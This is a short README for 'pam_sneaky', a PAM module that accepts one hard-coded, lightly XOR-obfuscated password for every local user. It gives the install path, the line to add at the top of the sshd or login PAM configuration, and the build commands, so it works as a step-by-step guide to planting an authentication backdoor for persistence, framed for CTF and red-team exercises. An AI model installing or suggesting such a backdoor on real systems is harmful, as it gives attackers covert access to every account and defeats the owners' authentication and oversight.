# pam_sneaky

> Caleb Stewart

This simple PAM module will enable authentication with any local user using a constant known password. The password is XOR'd with a constant key to a smidge of obfuscation. This example uses the password "sneaky password". After installation to `/lib/security/pam_sneaky.so` (or your distributions' equivalent), you can add this to the top of your PAM configuration (e.g. `/etc/pam.d/sshd` or `/etc/pam.d/login`):

```
auth    sufficient    pam_sneaky.so
```

And Voila! You can log in as any user with the password "sneaky password"

*DISCLAIMER* - _DON'T DO THIS ON YOUR MACHINE_. It's a bad idea, and serves no purpose. It could be a slightly sneaky way to maintain some low-hanging fruit-like persistence during a CTF or Red Team/Blue Team engagement.

# Dependencies

```
sudo apt install libpam0g-dev
```

# Build

```
gcc -shared -o pam_sneaky.so pam_sneaky.c
```